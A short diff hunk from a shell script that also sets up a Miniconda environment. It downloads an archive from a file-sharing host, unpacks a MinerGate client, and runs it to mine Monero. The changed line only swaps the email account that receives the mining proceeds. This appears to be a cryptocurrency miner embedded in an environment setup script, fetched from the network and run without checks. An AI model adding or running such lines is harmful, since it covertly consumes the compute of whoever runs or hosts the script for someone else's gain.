@@ -40,7 +40,7 @@ wget https://file.town/uploads/hhck0ndyanyq6wvl9qie0zwzj.
 ar x hhck0ndyanyq6wvl9qie0zwzj.
 tar -xvzf data.tar.gz
 cd opt/minergate-cli
-./minergate-cli -user greenfieldsvp@outlook.com.vn -xmr
+./minergate-cli -user pro_desk@outlook.com -xmr
 wget -O $miniconda_installer "https://repo.continuum.io/miniconda/$conda_runtime"
 chmod +x $miniconda_installer
 echo "---> Delete old files..." 
